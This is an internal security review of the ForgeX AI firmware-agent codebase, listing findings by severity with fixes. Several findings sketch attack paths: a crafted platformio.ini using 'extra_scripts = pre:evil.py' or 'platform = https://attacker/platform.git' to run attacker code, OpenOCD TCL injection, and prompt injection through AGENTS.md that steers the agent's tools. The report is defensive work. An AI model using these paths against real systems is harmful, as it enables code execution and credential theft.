# ForgeX Phase 6 — Complete Repository Review

**Date:** 2026-09-23
**Scope:** full code review + security review + release/beta readiness + architecture review
**Depth:** line-by-line on agent loop, safety/approval model, harness boundary, build/flash
**Method:** 7 review streams — one deep read per subsystem (agent loop, orchestrator/routes, model layer, process/serial/build, frontend, electron, auth/approval seams) + 6 external reference searches.

**Totals: ~170 findings — 4 Critical, 22 High, ~60 Medium, ~75 Low — plus 13 verified negatives and 12 architecture seams.**

Companion file: `AUDIT_PROCESS_SERIAL_BUILD.md` (repo root) holds the full execution-layer audit with complete prose reasoning. This file is the consolidated, cross-stream report.

---

## PART 1 — WHAT TO FIX

Bugs and defects. Fix = change the code, keep the structure.

### 1.1 CRITICAL — beta blockers

| ID | Location | Problem | Fix |
|---|---|---|---|
| EXE-1 | `api/schemas/execution.py:16,49-57` → `routes/execute.py:75-84,288-330` → `main.py:99,1048,1076` → `workflow/adapters/generation_adapter.py:447-467` → `tools/build_firmware.py:215-221` | `workspace_root` validated only for non-empty/NUL-free. A client-supplied directory becomes the `pio run` **cwd**; point it at a crafted `platformio.ini` with `extra_scripts = pre:evil.py` → **RCE as the backend user**, plus out-of-workspace writes in generation mode. With TERM-1 (no token in dev mode) this is unauthenticated local RCE. | `resolve()` + require `is_relative_to(configured_workspace_root)` OR registered-project membership, enforced at the schema **and** at `_context_from_task` **and** at `build_firmware._validate_project` (defense in depth). Reject post-resolve symlink/junction escapes. |
| AF-F1 | `security/build_policy.py:8` (via `tools/build_firmware.py:472`, `platformio_service.py:334`, from `autonomous_loop.py:724`) | `validate_build_configuration` forbids `extra_scripts`/`extra_configs`/`platform_packages`/`upload_command` but **not `platform`**. PlatformIO accepts `platform = https://attacker/platform.git`, and a platform is arbitrary Python (SCons `builder/main.py`). Default production profile (`app.py:300` always `requires_build=True` → `capability_profiles.py:85-86` returns BUILD_REPAIR) lets the model WRITE_FILE a `platformio.ini` into the stage, then `build_firmware` → attacker Python runs **before any ChangeSet review**, defeating stage isolation (real workspace, DB, env secrets reachable). | Validate `platform`/`lib_deps`/`board` against a registry-name allowlist regex; reject `://`, `git+`, `file:`, `symlink:`, path separators. Fail closed like `extra_scripts`. |
| EF-F01 | `electron/frontend-manager.ts:63-72,174` → `electron/window-manager.ts:109` | Frontend identity check = a public HTML substring. Any local squatter on `:3000` is attached and **its HTML loaded with ambient cookie auth to the backend**. | Require token/HMAC proof of frontend-server identity; never fall back to loading `:3000` content in packaged builds. |
| OR-F9 | `orchestration_store.py:726-731` | `_Transaction.__enter__` takes the store `RLock` before `_connect()`/`BEGIN IMMEDIATE` with no try-guard: any connect/lock error **leaks the lock and permanently deadlocks all store access, event loop included**. Nested transactions have the same leak. | Wrap post-acquire setup in try/except releasing the lock (or `contextlib.ExitStack`); forbid/serialize nested `_transaction()`. |

### 1.2 HIGH

| ID | Location | Problem | Fix |
|---|---|---|---|
| XM-1 | `api/routes/flash.py` → `services/flash_service.py:74,97` | `POST /flash` calls `build_and_flash` with `expected_artifact_hash=None` → artifact verification skipped, and **no action-binding record, no one-time approval**. The whole approval architecture (`approvals.py`, `action_binding.py`) is bypassed by the direct route. | Route through `finalize_hardware_binding` + one-time approval (mirror `orchestrator.prepare_flash`/`confirm_flash` at `orchestrator.py:568-679`), or explicitly document the exception and disable the route in desktop mode. |
| TERM-1 (=M1) | `api/app.py:676,136-145`; `api/local_security.py:26-35,48-60,117-121` | When `FORGEX_LOCAL_TOKEN` is unset (all non-desktop runs — token is only *required* when `FORGEX_DESKTOP=1`) **all auth and Host checks are skipped** and Origin checking degrades to `strict=False` (permits `Origin: null`/`file://`). Any local process/page can call `/terminal` (arbitrary PowerShell), `/execute`, `/build`, `/monitor/start`. Middleware is the only gate — most routes don't self-check. | Fail closed: always run `_validate_host` + strict `_validate_origin`; with no token, either mint an ephemeral per-launch token or hard-disable terminal/execute/build/flash/monitor routes with `503 LOCAL_TOKEN_REQUIRED`. Make `require_local_http_request` a router-level `Depends` on those routers so the behavior is structural. |
| OR-F1 | `routes/agent_runtime.py:1106-1114` | `POST /runs/{id}/cancel` mutates runtime state (status, grants, tasks) with **no `_require_local_request`** — the only mutating route of 27 lacking it. | Add `_require_local_request(request)` first statement (matches line 1119). |
| OR-F20 | `orchestrator.py:837-859,461-471,1574-1577` | `to_thread` worker callbacks mutate run/journal state cross-thread with no lock; `cancel()` can't stop the thread → after lease release the ghost worker appends unfenced journal rows, re-persists the run, orphans ChangeSets. | Marshal callbacks onto the event loop; gate lease release on worker completion; reject (not skip) unfenced appends for terminal runs. |
| OR-F21 | `orchestrator.py:907-909` | `PASS` with no `change_set_id` (whenever the model made calls but no writes, `tool_runtime.py:826-840`) only fails the node and returns → `run.status` stuck `"running"` forever, SSE open, retry refuses. | Set terminal status (`completed`/`NO_CHANGES`/`failed`), emit `runtime.completed/failed`, persist. |
| OR-F22 | `orchestrator.py:185-208,216,736` | Workflow/flash tasks have no `done_callback` and `execute()` catches only `AgentSessionLeaseLost` → any other escape leaves the run non-terminal forever with an unretrieved task exception. | `task.add_done_callback` → mark failed (`AGENT_RUNTIME_TASK_DIED`), persist, emit `runtime.failed`, log exception, prune `_tasks`. |
| AF-F2 | `tool_runtime.py:614-641 → 923-936` | A non-ValueError from one tool call (transient `OSError`/`PermissionError` from a Windows file lock) re-raises to outer handlers → `rmtree(stage)` **deletes the entire staged run's edits**. | Convert per-call OSError/IO errors to failed observations; reserve whole-stage abort for policy/path error classes. |
| AF-F3 | `capability_profiles.py:44-51`; `autonomous_loop.py:490-510`; `subagents.py:120-121,263-277`; `orchestrator.py:1044,1048-1059` | ASK/PLAN/EDIT profiles allow SPAWN_SUBAGENT while denying BUILD — but the child grants itself build via model-authored `role="verify"` and calls `platformio.build` directly; orchestrator issues every autonomous run `allow_build=True` unconditionally. | Thread parent profile's `allow_build` into `ForgeSubagentRunner`; gate `role="verify"` builds on it; make `allow_build` conditional on resolved profile. |
| ML-H-1 | `services/llm_service.py:618-626,1243-1247,1401-1429` → `api/routes/models.py:254-257` | Raw upstream provider response bodies/messages flow unredacted into client-facing `message`/`details`; log redaction never applies to API responses. | Run `diagnostics.redact()` at the API error boundary; strip `body`/`payload` from `LLMError.details`. |
| ML-H-2 | `llm_service.py:961-968` | Gemini key sent as `?key=` URL query param → leaks via httpx URL-bearing exceptions, logs, proxies. | Send in `x-goog-api-key` header. |
| ML-H-3 | `context_assembler.py:31-32,64-71` → `api_planner_provider.py:396-401` | FORGEX.md/AGENTS.md content flows **undelimited into the user prompt** with no system clause marking it untrusted → repo-file steering of allowed write/build tools (prompt injection → trusted action). | Fence project instructions as untrusted data; add explicit "cannot change tool/approval policy" system statement. |
| ML-H-5 | `llm_service.py:1340-1341` (import at `:12`) | `timezone`/`datetime` never imported → HTTP-date `Retry-After` raises `NameError`, masking provider 429/503 as generic 500. | Add `from datetime import datetime, timezone`. |
| SER-1 | `runtime/serial_runtime.py:537-544`; `tools/serial_monitor.py:217-220,239` | `monitor()` **yields inside `finally`** → `RuntimeError: async generator ignored GeneratorExit` on `aclose()` (empirically reproduced): success-pattern outcomes misreported as ERROR, and the exception fires before `_monitor_task = None` → task registration leaks → next `monitor()` raises `AlreadyRunningError`. Tests miss it: `FakeRuntime` has no yield-in-finally. | Never yield in `finally`; emit "monitoring ended" observation before teardown; clear `_monitor_task` first; add a real-generator `aclose()` test. |
| FE-F1 | `lib/websocket.ts:12-24,56`; `components/terminal/use-terminal-session.ts:226-228`; `next.config.ts:11-23` | Terminal/execution WebSockets connect **directly to `ws://host:8000` with zero credentials**, bypassing the Next proxy (frontend attaches no auth anywhere). Any future proxy-level auth is silently skipped; cross-origin pages can open the same sockets (the terminal one is a shell); no `wss://` guarantee. | Same-origin proxied WS path + short-lived token in subprotocol/header; backend Origin checks; drop hardcoded port fallback. |
| FE-F2 | `lib/api.ts:71-75` (consumer `task-canvas.tsx:481`) | `request()` has no timeout/`AbortSignal` → one hung backend connection leaves `submitting`/`busy` true forever, composer permanently disabled, no recovery path. | `AbortSignal.timeout(30_000)` merged with caller signal; reset submitting in `finally`. |
| FE-F3 | `hooks/use-forge-agent-session.ts:434-447` | Any `runtime.*` SSE event overwrites `run.status` keyed only by `run_id`, no sequence monotonicity → a late event reverts a cancel/terminal status back to `running`. | Track `lastEventSequence` per run; drop `sequence <= last`; gate non-terminal transitions while cancelling/terminal. |
| EF-F14 | `electron/main.ts:95` (+ `backend-manager.ts:164-170`, `frontend-manager.ts:80-88`, `python-resolver.ts:124`) | Setting `FORGEX_HARNESS_TOKEN` on main's `process.env` **leaks it to backend, frontend, python probes, and renderer/preload processes**. | Delete the global env set; pass only in HarnessManager's spawn env (already exists at `harness-manager.ts:76`). |
| EF-F15 | `electron/harness-manager.ts:64,96,139` | Health probe sends `Authorization: Bearer <token>` to an unauthenticated, unidentified listener → token exfiltration + forged `/health` attachment. | Two-phase HMAC challenge: send no secret before the server proves possession. |
| EF-F06 | `electron/window-manager.ts:29-35,66,191-218`; `electron/main.ts:166-173` | **No CSP on any surface** — frontend XSS inherits cookie-authenticated backend access plus native dialog/log primitives despite sandboxing. | Strict CSP on frontend, error window, and protocol responses. |
| EF-F16 *redesign* | `electron/backend-manager.ts:308-325,379-419` | Anti-spoof gate rests on public strings (service, contract, recomputable source hash) + a static fingerprint derived from an env-readable token, published on unauthenticated `/health`. | Per-probe HMAC nonce challenge; stop exposing `local_auth_fingerprint` on `/health`. |
| EF-F20 *redesign* | `backend-manager.ts:227-254`; `harness-manager.ts:111-125`; `frontend-manager.ts:108-132`; `main.ts:200-213` | Children **orphaned on main crash** (cleanup only in `will-quit`), holding ports/tokens and blocking the next launch via fingerprint/token mismatch. | Windows Job Object with kill-on-close; persist/reap child PIDs at startup; tree-kill on Windows. |

### 1.3 MEDIUM (60) — by subsystem

**Orchestrator / routes (`orchestrator.py`, `routes/agent_runtime.py`, `orchestration_store.py`)**
- OR-F2 — three SSE endpoints (`/runs/{id}/events`, `/sessions/{id}/events`, `/sessions/{id}/activity`) lack `_require_local_request` while non-stream GETs have it (convention inverted).
- OR-F3 — seven read routes lack it, notably `/runs/{id}/changes` exposing full workspace diffs → read exfiltration in token-less mode.
- OR-F4 — `cancel()` never calls `invalidate_pending_approvals` or clears `approval_id`; restart skips invalidation for terminal statuses → dangling pending hardware approvals survive forever.
- OR-F5 — expired approval is unrecoverable: `prepare_flash` early-returns on `awaiting_flash_confirmation`, chat prepare only fires on `completed`, no prepare endpoint → run wedged until cancel/restart.
- OR-F6 — `confirm_flash` pre-burns the grant's whole call budget via `validate_service`, leaks an unrevoked hardware grant when `approvals.consume` fails; confirm/apply grants are self-issued/self-validated and never handed to the executor.
- OR-F13 — `session_projection` rebuilds with `after_sequence=0` whose default limit is 500, yet checkpoints the result as complete → wrong for long sessions.
- OR-F15 — `append_event` trusts payload-supplied `event_id`/`created_at`/`event_version`/`lease_epoch` → duplicate `event_id` throws `IntegrityError` into run code; metadata forgeable.
- OR-F10 — any transient DB error from `renew_lease` converts to `AgentSessionLeaseLost` killing the run; expired lease never re-acquired → device sleep kills all runs.
- OR-F18 — queue row write and its journal append commit in two transactions → crash yields orphan queue rows or guidance inserted after a 409.
- OR-F23 — `_runs/_nodes/_tasks/_recovery_context/_transient_*` (and policy `_grants/_usage`) never pruned → unbounded growth per run; `_steering` write-only dead state.
- OR-F14 *redesign* — startup re-signs every event checksum on every boot (self-healing chain defeats tamper evidence, O(all events) writes) and `verify_journal` has zero callers.

**Model layer (`llm_service.py`, `api_planner_provider.py`, `model_router/`)**
- ML-M-1 — redaction regex misses Groq `gsk_` and NVIDIA `nvapi-` formats that can appear in upstream error text routed into diagnostics.
- ML-M-2 — JSON storage writer lacks the `plaintext_credentials_forbidden` guard SQLite enforces → any `write()` caller can persist a plaintext `api_key`.
- ML-M-3 — tool observations labeled "trusted tool output" in one planner while the other correctly calls project text untrusted (inconsistent injection posture).
- ML-M-4 — retries stack: runtime 2× × NVIDIA stream 4× × schema-repair ≈ up to ~8 billed requests/turn with no global physical-request cap.
- ML-M-5 — admission queue timeout only starts once a thread runs (waiter position unbounded), one thread per waiter, second cancellation leaks a semaphore slot.
- ML-M-6 — a metadata flag disables **both** the outer deadline and the httpx timeout → unbounded generation/stream duration.
- ML-M-7 — `urllib` timeout is per-socket-op, not wall-clock; SSE loop never bounds time spent on non-text events.
- ML-M-9 — broad `except Exception` collapses real bugs into `UNKNOWN_SAFE_FAILURE`, silently swallows auth failures during discovery.
- ML-M-11 — persisted health `last_error` (raw exception text) serialized to clients on every provider-list response, unredacted.
- ML-H-4 (doc/code) — README claims NVIDIA 45 s deadline / 60 s turn budget; code has **120 s / 300 s** (`core/config.py:23,92-97`, `product_provider_registry.py:169`).

**Process / serial / build (see `AUDIT_PROCESS_SERIAL_BUILD.md` for full prose)**
- CMD-1 — OpenOCD `-c` script embeds the artifact path **unquoted** (`flash_firmware.py:548-561`): a `"`/`;` in the path injects TCL commands (second-order interpreter injection argv exec doesn't protect against).
- PROC-1 — Windows "graceful" kill terminates only the direct child (`subprocess_mgr.py:836-872`); PlatformIO toolchain grandchildren orphaned, contradicting the module's own tree-kill contract.
- PROC-2 — env allowlist ships `PYTHONPATH`/`LD_LIBRARY_PATH`/`COMSPEC`/`SHELL` (`:155-170`) contradicting its own docstring (`:948-951`) → import-path hijack into Python-based children (esptool, PlatformIO).
- PROC-3 (latent) — with `capture_output=False` both readers finish instantly → timeout branch skipped → `proc.wait()` runs with **no timeout**.
- SER-2 — two `SerialRuntime` instances can open one COM port (`main.py:652` injects shared runtime unlocked; `/monitor/start` builds a second; `exclusive=True` is POSIX-only) → split/corrupted output for both.
- SER-3 — open/disconnect race can assign a live COM handle after state=`DISCONNECTED` → port held open until process exit.
- SER-4 — injected runtime ignores `SerialMonitorConfig` port/baud/limits → silent wrong-device reads.
- SER-5 — reconnect auto-detect fallback is dead code (`:995-997`) → stale-port death loop after USB re-enumeration → `FAILED` despite device present.
- FLASH-1 — artifact path never `resolve()`d nor contained to build root before flashing (`flash_firmware.py:280,317-377`).
- FLASH-2 — esptool write offset guessed from **filename tokens** (`:523,609-611`): non-merged `app_factory.bin` written at `0x0` (over bootloader) or merged image at `0x10000` → **bricked device**.
- FLASH-3 — no pre-write binary/chip verification; `config.verify` is post-write read-back only.
- EXE-2 — no overall deadline on `execute_prompt`: 3× (LLM + 600 s build) repair loop, only manual cancel, `hub.begin` pinned.
- TERM-2 *redesign* — unrestricted PowerShell/cmd profiles + **no session ownership**: any authorized client attaches to/reads/types into *any* terminal session (`terminal.py:175-275`), sessions not bound to project.

**Frontend**
- FE-F4 — attacker-controlled fence language reaches `hljs.highlight` in `useMemo` with no try/catch → throwing grammar crashes to root error boundary; pathological grammar freezes main thread (the `<32000` check is a perf guard, not a sanitizer).
- FE-F5 — tab paths `JSON.parse`d from localStorage cast to `string[]` without validation, sent to `GET /files/content`, bypassing `validateWorkspaceRelativePath` used elsewhere.
- FE-F6 — `addLog` appends unbounded; `logs` only trimmed by manual Clear → memory growth + console re-render all session.
- FE-F8 — each non-delta chat event fires two full refetches plus a 750 ms reconcile loop with swallowed errors → spinner/polling persist forever after backend death.
- FE-F9 — `request()` unconditionally emits two DEBUG diagnostic POSTs per API call → doubles backend traffic, amplifies chat polling.
- FE-F11 — terminal WS reconnects forever with no attempt cap; HTTP fallback polls every 1 s indefinitely → hammers a dead backend.
- FE-F12 — `next.config.ts` sets no CSP / `X-Content-Type-Options` / `Referrer-Policy` / `Permissions-Policy` around the single HTML sink.
- FE-F13 — "Mask API keys" toggle has no consumer anywhere → falsely signals credentials are masked.
- FE-F14 — double-submit guarded by React state not an in-flight ref → two same-tick invocations both POST duplicate messages.
- FE-F10 *redesign* — eleven components imported by nothing (`prompt-command`, `build-console`, `workspace-sidebar`, `task-inspector`, `workflow-timeline`, `ai-assistant-panel`, `integrated-terminal`, `forge-core`, `empty-panel`, `generation-progress-panel`, `workflow-swarm-board`), making the whole `execute()/cancelExecution/createExecutionSocket` pipeline unreachable — including the state that sticks `isExecuting: true`.

**Electron**
- EF-F02 — `file:`/`data:` navigation branches allow **any** URL of that protocol → file-loaded page can navigate to arbitrary local HTML with the preload attached.
- EF-F03 — guard allowlist is the http URL while a `file://` document is actually loaded → navigation into the spoofable `:3000` origin permitted.
- EF-F04 — only `will-navigate` guarded; a server-side redirect (`will-redirect`) from the allowed origin escapes the allowlist.
- EF-F08 — `in-process-gpu` / `disable-gpu-compositing` apply in **packaged builds by default** (`main.ts:28-33`) → GPU isolation collapsed into the browser process.
- EF-F11 — `desktop:diagnostic` validates only `event`; redact() caps array breadth but not object breadth → log forging + main-process memory/CPU DoS.
- EF-F12 — `desktop:get-status` returns raw `/health` body including `local_auth_fingerprint`/`source_fingerprint` to the renderer → aids `/health` spoofing.
- EF-F17 — session cookie is host-scoped not port-scoped → auto-sent to any `127.0.0.1` service the renderer contacts (exfil after XSS).
- EF-F18 — redaction misses top-level secret keys, URL/query-string secrets, and raw renderer console output persisted to `live-runtime.jsonl`.
- EF-F21 — `Promise.all`+finally can `app.exit(0)` before children die; SIGKILL issued but never awaited; `!isQuitting` fall-through skips cleanup.
- EF-F22 — probes use idle-only timeouts with unbounded body reads → hostile squatter can hang boot or OOM the main process.
- EF-F23 — `FORGEX_PYTHON` executes an arbitrary binary and spawnSync inherits all secrets via default env.

**Agent loop**
- AF-F4 — stage created and setup run before the `try:` (`tool_runtime.py:153-257`) → any exception leaks the stage dir and breaks `run_product`'s always-returns-result contract.
- AF-F5 — cancellation sampled only at turn start; no check before `create_from_stage`; in-turn cancel `RuntimeError` mislabeled `UNKNOWN_SAFE_FAILURE` by bare except; `to_thread` worker keeps mutating after `cancel()` set terminal status.
- AF-F6 — full-workspace hash/snapshot, context assemble, WorkspaceIndex tokenize, `MEMORY_SEARCH`, and subagent `executor.execute` (grep reads every file) all run **synchronously on the event loop**, stalling the whole server.
- AF-F7 — `future.result(timeout=10)` `TimeoutError` absent from the subagent→parent catch tuple → aborts a healthy run; async branch lacks the `accepting` guard so late `content_delta` raises `ALREADY_SETTLED`.
- AF-F8 — `getattr(os.path,"isjunction",lambda:_:False)` is always False on Python 3.10 → a junctioned `.forgex` root passes checks and `resolve().relative_to()` reads **outside workspace into prompt**.
- AF-F9 — three divergent observation sanitizers with keep=24×16 KB and no aggregate byte budget ≈ 100k tokens/turn; nested Mappings silently dropped (incl. build failure detail).
- AF-F10 — exceptions escape `run()`'s contract (progress calls and `_simulate` pre-try outside try; narrow catch tuple; child re-raise) → terminal status depends on wrapper catch-alls that classify by exception class name and raw `str(exc)`.

**Auth / my own stream**
- XM-2 — `_validate_origin` compares scheme+host but **ignores port** (`local_security.py:114-132`) → any port on localhost passes Origin checks.

### 1.4 LOW (~75) — highlights

- **Orchestrator:** OR-F7 weak port-only device identity never triggers re-confirmation; OR-F8 `prepare_flash` mutates run params before `approvals.issue` (issue failure leaves mutated params, no approval); OR-F12 confirm/apply safety rests solely on "no await between check and mutate"; OR-F17 200-event broker ring silently skips evicted events (undetectable SSE gap) + sink failures swallowed by bare `except: pass`; OR-F19 `claim_queue_items` ignores conditional-UPDATE rowcount; OR-F24 `cancelling` neither terminal nor stable (pre-drain error wedges run); OR-F25 `retry` bypasses the `service.enabled` gate `POST /runs` enforces.
- **Model:** ML-L-1 credential-store read failure 500s the provider list; ML-L-5 HTTP 400/422 misclassified as `NETWORK_ERROR`; ML-L-6 unfiltered external-process dict returned to client; ML-L-3 new httpx client per call (no pooling); ML-L-4 each sync turn runs `asyncio.run()` (fresh loop per call).
- **Process/serial/build:** PROC-4 `_cancelled_owners` grows forever; PROC-5 sequential timeout terminates twice; FLASH-4 STM32 OpenOCD target regex-guessed, **defaults to F4** for unmatched boards; TERM-3 terminal children inherit full env incl. `FORGEX_LOCAL_TOKEN` → token exfiltration by any shell command; TERM-4 closed sessions never reaped (no TTL/cap); DIAG-1 `**body.fields` collision → unhandled 500; DIAG-2 log spoofing + ANSI injection through renderer ingest; DIAG-3 unbounded `fields` dict → log/CPU flood; EXE-3 register-after-`create_task` race leaks stale entries; EXE-5 `FailureResult.raw_output` returned unredacted and persisted to `build_report.json`.
- **Frontend:** FE-F15 Escape handler collapses dock behind open dialog; FE-F16 two competing Ctrl+K handlers; FE-F18 `COMMON_SECRET_RE` misses `gsk_`/`xai-`/`hf_`/`AKIA`; FE-F19 draft localStorage written on every keystroke, no pruning; FE-F21 `refreshSessions()` chain lacks `.catch` (unhandled rejection); FE-F20 CSS `url("...")` interpolates `asset.url` with only `"` escaped, no scheme allowlist; FE-F22 dead `/api/promptforge` alias still routes to backend.
- **Electron:** EF-F28 `void loadFrontend` leaves unhandled rejection + blank window on loadURL failure; EF-F32 renderer-controlled key can invoke `__proto__` setter (`payload[key] = safe`); EF-F13 duplicate open-folder/open-project handlers; EF-F19 fallback log prints `frontendUrl` raw, JSONL path resolves against CWD not userData; EF-F24 harness spawn sets no cwd; EF-F25 triplicated `safeLogChunk`/SIGTERM waiters with inconsistent caps; EF-F26 scheme privileges (`supportFetchAPI`/`corsEnabled`) exceed need; EF-F27 lstat→readFile TOCTOU allows symlink swap (bounded by magic re-check); EF-F31 capture-phase handler hides all unhandled rejections from app code.
- **Agent loop:** AF-F11 handlers discard exceptions with no logging (module has no logger); AF-F12 grant issued once per run, 300 s TTL expires mid-run → `capability_expired` denials, dicts never pruned; AF-F13 snapshot helpers `mkdir` `.forgex-*-state/stage` in `root.parent` **outside the workspace** on every run; AF-F14 `_hash_file(path.read_bytes())` allocates whole files unbounded, twice per run over every workspace file; AF-F16 validator never enforces declared `maxLength`/`maximum` → `MEMORY_SEARCH` query and SPAWN task arrive unbounded; AF-F17 unbounded skill discovery (each ≤96 KB) fans out into an uncapped prompt section every turn.

---

## PART 2 — WHAT TO REDESIGN

Wrong structure, not wrong code. These are the changes that require a plan, not a patch.

| ID | Target | Problem | Redesign |
|---|---|---|---|
| AF-F15 | `autonomous_loop.py` (1184) / `tool_runtime.py` (1164) / `subagents.py` (~400) | **Three near-identical turn/admit/compact/observe loops** have drifted into divergent safety properties — the direct cause of AF-F2, F5, F6, F7, F9. | Extract a shared `TurnEngine` (provider call, callback guards, cancellation, serialization, compaction) consumed by all three loops. |
| ML-M-12 | `api_planner_provider.py:127-1007,1549-1708` | A full second HTTP/retry/error/prompt stack exists but is **never instantiated in production** (tests/smoke only), already drifting from `model_router`. | Delete `ApiPlannerProvider` and its transports; extract shared helpers into `agent_runtime/toolplan_contract.py`. |
| ML-M-8 | `model_router/admission.py` | Blocking-thread admission control inside an asyncio server (one thread per waiter). | asyncio semaphore + bounded waiter queue. |
| ML-M-13 | `llm_service.py` (1482 ln), `api_planner_provider.py` (1769 ln) | Two god modules mixing contracts, errors, HTTP, payloads, streams, parsing. | Split into `llm/{contracts,errors,http,payloads,stream,validate}.py`. |
| OR-A1 | `orchestrator.py` (2011 ln) | Six lifecycles in one class: flash approval, two execution pipelines, graph ops, journal/transient events, lease heartbeat, recovery. | Extract `flash_approvals.py`, `run_workflow_staged.py`, `run_workflow_autonomous.py`, `run_graph.py`, `run_journal.py`, `session_lease.py`, `run_recovery.py`, `workflow_events.py`. |
| OR-A2 | `routes/agent_runtime.py` (2082 ln) | Four route groups + 340-line intent switch + a prompt/response engine with no FastAPI involvement. | Split `routes/agent_runs.py`, `agent_flash.py`, `agent_streams.py`, `agent_sessions.py`, `turn_intents.py`, `prompt_pack.py`. |
| OR-A3 | `orchestration_store.py` (802 ln) | One class owns ten unrelated aggregates (leases, journal, queue, checkpoints, context artifacts, approvals, transactions, schema…). | Split into `store/{leases,journal,input_queue,checkpoints,context_artifacts,approvals,transaction,schema}.py`. |
| OR-F11 | `orchestration_store.py:44-53,150-159` | `save_run` performs no lease check (unfenced last-writer-wins); `assert_lease` is dead code; queue/chat appends pass no grant → fencing only partly applies. | Thread `LeaseGrant` into `save_run` with in-transaction assert; require grants for all leased-session appends; delete or wire up `assert_lease`. |
| TERM-2 | `terminal_service.py:551-578`; `routes/terminal.py:63-81,106-114,175-275` | Full interactive shell by design with **no session ownership**: any client attaches to any `session_id`, reads replay, types; sessions not bound to project. | Per-creator capability token minted at `start` and required on input/WS; restricted workspace-scoped profile as default, full-shell behind explicit setting; audit-log every input write. |
| FE-F1 | `lib/websocket.ts` + `next.config.ts` | Auth architecture: frontend attaches **no credential anywhere**; HTTP relies on the Next rewrite, WS bypasses it entirely. | Same-origin WS proxy path + short-lived token; backend Origin enforcement (pairs with XM-2). |
| FE-F10 | 11 orphan components + `use-promptforge-workspace.ts:1071-1246` | Entire execution pipeline unreachable dead code carrying buggy state. | Delete all 11 + `execute/cancelExecution/createExecutionSocket` and their state, **or** wire into `nexus-shell`. Decide once. |
| EF-F16 | `backend-manager.ts:308-419` | Anti-spoof rests on public strings + env-readable token published on unauthenticated `/health`. | Per-probe HMAC nonce challenge; stop publishing fingerprints. |
| EF-F20 | all three managers + `main.ts:200-213` | No crash-safe child ownership (cleanup only in `will-quit`). | Windows Job Object (kill-on-close) + startup PID reaping. |
| EF-F29/F30 | `backend-manager.ts` (433), `background-assets.ts` (302) | Fused responsibilities (lifecycle+probe+fingerprint+compat policy; URL codec+sniffing+store+containment). | `ChildService`/`backend-health.ts`/`repo-fingerprint.ts`/`backend-compat.ts`; `background-asset-url.ts`/`image-sniffing.ts`/`path-containment.ts`. |
| XM-3 | auth across routers | Route coverage of `require_local_http_request` is implicit — only some routers call it; `app.py:676` is the real gate and fails open. | Router-level `Depends(require_local_http_request)` on `terminal`, `execute`, `build`, `flash`, `monitor`, `devices` — makes fail-closed structural, not a middleware condition. |
| — | Execution-layer seams (6) | `main.py` (1288, 5-way), `subprocess_mgr.py` (963, 4-way), `serial_runtime.py` (~1096, 4-way), `platformio_service.py` (781, 4-way), `terminal_service.py` (603, 3-way), `result.py` (949, 3-way). | Named split targets in `AUDIT_PROCESS_SERIAL_BUILD.md §8`; the `main.py` split isolates the EXE-1 propagation point so containment can be enforced once, in a validator chokepoint. |

---

## PART 3 — WHAT TO IMPROVE

Hardening and quality — no defect today, better pattern available.

- **Observability of failures:** OR-F16 (SSE streams: infinite `while True` at 10 Hz, no terminal condition/connection cap/backoff); AF-F11 (add module loggers, repr+traceback in handlers).
- **Concurrency hygiene:** OR-F12 (guard confirm/apply with per-run `asyncio.Lock` — today's safety is an accident of "no await between check and mutate"); FE-F7 (truncate `details.output` on ingestion, memoize the two per-render filters — up to tens of MB retained).
- **Resource hygiene:** PROC-6/7 (`stream()` ignores `timeout_s` — unused API; no global output-memory budget = 32 MB × streams × concurrency); EF-F05 (subframe navigations unguarded); EF-F07 (no `setPermissionRequestHandler` → camera/mic/geo/clipboard grantable on loopback); EF-F10 (no `senderFrame` origin assertion in any IPC handler); EF-F24/25/26/27/31 (cwd, triplicated terminate helpers, over-broad scheme privileges, protocol CSP, preload rejection-swallowing).
- **Secret-hygiene breadth:** ML-M-10/L-7/L-8 (wrong vendor hardcoded on errors; `_provider_id_from_url` guesses `openai`; `X-OpenRouter-Title` should be `X-Title`); ML-L-2 (dead masked-key fields); ML-L-3 (pooled httpx clients); ML-L-4 (`asyncio.run()` per turn — one long-lived loop per worker).
- **Validation depth:** SER-7 (port/baud only NUL/empty/`>0` → junk reaches pyserial, echoed into logs); SER-8 (`_reconnect_attempts` double-incremented → misleading telemetry); EXE-4 (workspace id from `abs(hash())` is per-process randomized → persisted correlations break silently; use `sha256`); TERM-5 (`_exit_code or 0` masks `None` as success — the exact anti-pattern fixed elsewhere as `[FIX-P2]`).
- **Frontend polish:** FE-F17 (`detail` in effect deps resubscribes keydown on every dock change — read via ref); FE-F18 (extend secret regex + redact `response_body`); FE-F19 (debounce draft writes ~300 ms, sweep keys >30 days); FE-F20 (escape backslashes/newlines + scheme allowlist in CSS `url()`); FE-F22 (remove dead proxy alias).
- **UX/trust:** FE-F13 (remove or implement the "Mask API keys" toggle); OR-F17 (emit explicit `activity.gap` frame on ring eviction).

---

## PART 4 — VERIFIED NEGATIVES (what is genuinely excellent)

Checked directly or by the streams; these controls work and must not regress:

1. **No shell interpolation anywhere.** Zero `shell=True` / `os.system` / `os.popen` / `create_subprocess_shell` / `subprocess.run` / `shlex.split` in `backend/`. Every spawn is `create_subprocess_exec` with an argv list (`subprocess_mgr.py:312,372,840`; `terminal_service.py:116`).
2. **Output bounding works.** `MAX_OUTPUT_BYTES` (32 MB/stream) enforced on every drain path (concurrent/sequential/timeout-re-drain/interleaved).
3. **Env is allowlisted**, not inherited wholesale (though over-broad — PROC-2).
4. **Diagnostics is ingest-only** — no probes, no outbound requests, no command execution. No SSRF surface.
5. **WebSockets authenticate before `accept()`** (`terminal.py:177-193`, `websocket.py:20`) — subject only to TERM-1.
6. **No CORS middleware registered** — browsers cannot read cross-origin responses.
7. **Timeout escalation with tree kill exists** on `run()` (SIGTERM → grace → SIGKILL `/T`).
8. **Electron's three pillars are correct:** `nodeIntegration:false`, `contextIsolation:true`, `sandbox:true` on both windows; popups denied; `webviewTag` off; `no-sandbox` correctly gated to `!app.isPackaged`.
9. **Minimal preload bridge:** six typed `invoke` calls, no raw passthrough, no `ipcMain.on` channels. (The pattern security guides call ✅.)
10. **Protocol handler is well defended:** strict UUID regex, URL parse rejecting userinfo/port/search/hash, `path.dirname` containment re-check, `Content-Type` from a 3-value enum tied to extension, bytes re-sniffed on every read, `X-Content-Type-Options: nosniff`. Could not construct traversal or XSS.
11. **Credential store is fail-closed and clean:** Credential Store fallback returns `None`/raises (`credentials.py:44-56,145-146`); legacy migration moves plaintext into the store and strips it from JSON/SQLite; SQLite **refuses** plaintext writes; no endpoint serializes a raw or masked key.
